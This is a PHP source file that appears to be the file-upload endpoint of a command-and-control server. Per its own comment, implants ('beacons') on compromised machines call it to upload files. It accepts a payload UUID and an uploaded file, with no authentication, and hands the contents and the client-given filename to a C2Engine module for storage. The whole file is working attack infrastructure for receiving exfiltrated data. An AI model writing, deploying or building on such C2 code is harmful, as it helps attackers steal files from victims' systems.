<?php
/**
 * C2 File Upload API – used by beacons to upload files.
 */
require_once dirname(__DIR__, 3) . '/system/modules/C2Engine.php';

$payloadUuid = $_POST['uuid'] ?? $_GET['uuid'] ?? '';
if (!$payloadUuid) {
    http_response_code(400);
    die('Missing payload UUID');
}

if (!isset($_FILES['file'])) {
    http_response_code(400);
    die('No file uploaded');
}

$file = $_FILES['file'];
if ($file['error'] !== UPLOAD_ERR_OK) {
    http_response_code(500);
    die('Upload error');
}

$data = file_get_contents($file['tmp_name']);
$filename = $file['name'];

$c2 = new C2Engine();
$c2->uploadFile($payloadUuid, $filename, $data);

echo json_encode(['status' => 'ok']);
